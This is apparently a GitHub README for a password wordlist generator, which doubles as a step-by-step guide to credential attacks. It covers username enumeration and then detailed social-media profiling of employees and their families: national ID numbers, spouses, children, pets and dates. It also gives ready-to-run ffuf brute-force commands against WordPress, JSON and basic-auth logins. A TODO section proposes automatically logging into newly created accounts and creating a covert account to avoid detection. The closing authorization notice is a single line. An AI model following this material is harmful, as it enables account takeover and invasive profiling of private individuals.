# Password Wordlist Generator

A customizable password wordlist generator for bug bounty hunters and security professionals. Use personal and contextual data to build targeted password lists for ethical security testing.

**Focused on efficiency**: Despite using multiple words, numbers, and patterns, the tool generates concise wordlists through intelligent filtering. For example, the included `config.example.json` produces only ~90,000 passwords despite containing numerous personal data points, ensuring quality over quantity.

## Quick Start

1. **Setup**: Copy `config.example.json` → `config.json`
2. **Reset (optional)**: Run `python reset_config.py` to clear example data
3. **Edit config**: Fill in `config.json` with discovered personal info or desired keywords
4. **Generate**:
   ```bash
   python main.py
   ```
   Optional flags:
   - `--config <file>` — Use a custom config path
   - `--output <file>` — Save output to a custom file
   - `--external-wordlist <file>` — Merge with existing lists

## Features

- Template-based password generation: `{word}`,`{Word}`,`{word1}{Word2}`, `{number}`, `{special}`
- Recursively flattens data structures
- Converts dates like `YYYY-MM-DD` to multiple formats (`YYYY`, `YY`, `DDMM`, etc.)
- Icelandic accent normalization (`þ`, `ð`, `æ`)
- Case variants: lowercase, capitalized
- **Filtering**: Length limits, uniqueness checks, and exclusion rules keep lists concise
- **Single number constraint**: Only one number group per password (e.g., won't combine `2023` + `2022`) by default.
- **Date extraction**: Years extracted as both 4-digit (`1999`) and 2-digit (`99`) formats
- **Quality over quantity**: Advanced filtering produces focused wordlists rather than massive, unfocused ones
- Appends external wordlists (e.g., RockYou) if desired

## Wordlist Strategy Tips

- Enable `all_cases` for capitalized/uppercase variants, or experiment with your own patterns
- Use `excluded_word_combinations` to avoid weak or meaningless word combos. Any pair in the array will be excluded.

# Data Collection and Username Discovery Guide

## Baseline Password Wordlist Suggestions

When creating wordlists, always include basic, commonly used keywords:

- Company name
- Website domain (e.g., `target.is`)
- Seasons (`spring`, `summer`, `autumn`, `winter`)
- Recent years (`2020`, `2021`, `2022`, etc.)
- Simple numeric sequences (e.g., `12345`)

This can be used as a baseline if personal info about the user is scarce.

## Username Discovery

### Finding Valid Usernames

The first critical step is identifying valid usernames. Strategies include:

- **WordPress sites:** See the [Wordpress README](https://github.com/Bjarturl/Password-generator/blob/main/xml-rpc/README.md) in this repo.
- **Username enumeration:** Guess usernames and observe error messages:

  - Different response times or messages may indicate valid usernames.
  - Use common usernames like `admin`, `user`, or employee names found on the company website or LinkedIn.

- **Demos & documentation:** Check company YouTube or documentation for login screenshots or demo videos:

  - Note usernames shown and count password dots/asterisks to determine password length (`min_length`/`max_length`).

### Generic Usernames (e.g., `admin`, `user`, `test`)

If you have generic usernames but don’t know the actual user:

- Determine user roles based on the nature of the website:

  - Marketing sites: Marketing manager usernames
  - Technical sites: Developer or technical staff usernames

- Google dorking:

  ```
  site:target.is intext:"<person name>"
  ```

- If no strong leads are identified, try generic password lists (seasons, numeric sequences, company-related terms) or popular wordlists.

### Finding Emails

If emails are required:

- Google dorking:

  ```
  intext:"@target.is"
  ```

- Identify the company’s email format (e.g., `Firstname.Lastname@target.is`).

### Expanding Username to Full Name

If you only have a person’s first name as the username:

- Check the company website or use Wayback Machine for historical employee listings.
- Search LinkedIn and cross-reference with company employment. Might even be past employment but their account was never deactivated.
- Check company social media posts and likes to visually match employees to Facebook/Instagram profiles. Companies often post staff photos from events and such.
- Google dorking:

  ```
  intext:"<person name>" intext:"<company name>"
  ```

- If unsuccessful, revert to generic wordlists.

## Gathering Personal Information

Once you have a username and full name, gather additional personal details for targeted password guesses:

### Icelandic Social Security Number (Kennitala)

- Use Þjóðskrá lookup (accessible via your heimabanki).
- Kennitala can be a temporary password or part of one:

  - Include entire SSN and last four digits separately in your `config.json`.

- For common names, use the birth year digits (5th and 6th digits) to identify the correct person, if you manage to find their socials. Socials might give away where they are employed and you can use the photo to determine their age based on the birth year from their kennitala.

### Social Media Investigation

#### Facebook

- Look for spouse, children, and close family (parents, siblings):
  - Check comments, posts, likes for possible profiles.
  - Pay attention to Icelandic surnames (`-son`, `-dóttir`) to infer parent and sibling names, but generic last names work too.
- Note relationships from comments (birthday wishes, anniversaries). Spouse name might be mentioned with a post like "Hope x treats you well today" and from there you could try to find them in likes or comments.
- Record spouse and family profiles for deeper investigation later.

#### Personal Interests & Hobbies

- Identify unique hobbies, interests, clubs, or activities:
  - Avoid overly general interests (e.g., "cycling"). Opt for specific names/terms (clubs, sport teams, bands).
  - Document pet names and significant property from their past (boat names, farm names).
- Check for popular cultural interests (movies, books, series—e.g., Harry Potter) and add keywords from the franchise to your `config.json`.

#### Important Dates

- Birthdays (available via social media, kennitala, or Íslendingabók).
- Wedding dates (photo description from wedding or wedding anniversary post date).

#### Further Family Investigation

- Investigate profiles of immediate family (parents/siblings):
  - Check for childhood homes, pets, boats, or uniquely named properties.
- Check for grandchildren names from their posts as well.

### Instagram

- Use similarly as Facebook, but recognize relatives may be harder to identify.
- Infer family relationships from comments or likes if profiles are sparse.

### Phone Number

- Obtain phone numbers from:
  - `ja.is`
  - Facebook profiles

Follow this structured approach thoroughly to maximize the chances of discovering valid login credentials and related password information.

If your generated lists become too extensive, consider defining rules under excluded_word_combinations to skip unlikely combinations, such as multiple seasons (e.g., summer, winter, autumn, spring), since typically only one season is used.

## Using Generated Wordlists with ffuf

Once you've generated a targeted wordlist, you can use it with ffuf for various attack scenarios:

### WordPress Login Brute Force

```bash
# Basic WordPress login
ffuf -w wordlist.txt:FUZZ -X POST -d "log=admin&pwd=FUZZ" -H "Content-Type: application/x-www-form-urlencoded" -u https://target.com/wp-login.php -fs 1234

# WordPress with custom headers
ffuf -w wordlist.txt:FUZZ -X POST -d "log=admin&pwd=FUZZ" -H "Content-Type: application/x-www-form-urlencoded" -H "User-Agent: Mozilla/5.0" -u https://target.com/wp-login.php -mc 302
```

### Generic Login Forms

```bash
# Standard login form
ffuf -w wordlist.txt:FUZZ -X POST -d "username=admin&password=FUZZ" -H "Content-Type: application/x-www-form-urlencoded" -u https://target.com/login -fc 200

# JSON API login
ffuf -w wordlist.txt:FUZZ -X POST -d '{"username":"admin","password":"FUZZ"}' -H "Content-Type: application/json" -u https://target.com/api/login -mr "success|token"
```

### HTTP Basic Authentication

```bash
# Basic auth with custom wordlist
ffuf -w wordlist.txt:FUZZ -u https://target.com/admin -H "Authorization: Basic $(echo -n 'admin:FUZZ' | base64)" -mc 200
```

### Advanced ffuf Options

```bash
# Rate limiting and custom user agent
ffuf -w wordlist.txt:FUZZ -X POST -d "log=admin&pwd=FUZZ" -u https://target.com/wp-login.php -p 0.5 -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" -t 10

# Multiple wordlists (usernames + passwords)
ffuf -w usernames.txt:USER -w wordlist.txt:PASS -X POST -d "log=USER&pwd=PASS" -u https://target.com/wp-login.php -fc 200

# Output successful attempts to file
ffuf -w wordlist.txt:FUZZ -X POST -d "log=admin&pwd=FUZZ" -u https://target.com/wp-login.php -mc 302 -o results.json -of json
```

## (TODO) Automation Suggestions

If several users exist on a wordpress site new ones might regularly be getting created. consider scripting to automate:

- Regularly checking WordPress REST API for newly created accounts.
- Attempt quick logins using predetermined basic passwords on newly created accounts. like with the basic wordlist with seasons, year, company name etc. Or kennitala if you are fast enough to find the person.
- If you can login, create your own account without changing the victims password to avoid detection.

## Security Notice

Use only with proper authorization. This tool is for ethical security testing and educational purposes only.
